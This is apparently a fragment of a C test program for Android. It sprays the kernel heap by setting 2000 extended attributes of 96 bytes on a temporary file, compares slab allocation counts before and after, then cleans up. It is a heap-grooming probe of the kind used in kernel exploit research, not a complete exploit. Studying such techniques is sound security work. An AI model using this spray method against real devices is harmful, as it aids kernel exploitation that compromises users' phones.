int main(void){
	char v[96]; memset(v,0x42,sizeof(v));
	int fd=open("/data/local/tmp/xa_spray",O_CREAT|O_RDWR,0600);
	if(fd<0){printf("open fail %d\n",errno);return 1;}
	close(fd);
	long a0=slab128();
	int ok=0, N=2000, i;
	char name[64];
	for(i=0;i<N;i++){
		snprintf(name,sizeof(name),"user.k%04d",i);
		if(setxattr("/data/local/tmp/xa_spray",name,v,sizeof(v),0)==0) ok++;
	}
	usleep(200000);
	long a1=slab128();
	printf("baseline=%ld after=%ld delta=%ld  setxattr_ok=%d/%d\n",a0,a1,a1-a0,ok,N);
	for(i=0;i<N;i++){
		snprintf(name,sizeof(name),"user.k%04d",i);
		removexattr("/data/local/tmp/xa_spray",name);
	}
	usleep(200000);
	long a2=slab128();
	printf("after_remove=%ld (vs baseline %ld)\n",a2,a0);
	unlink("/data/local/tmp/xa_spray");
	return 0;
}
```
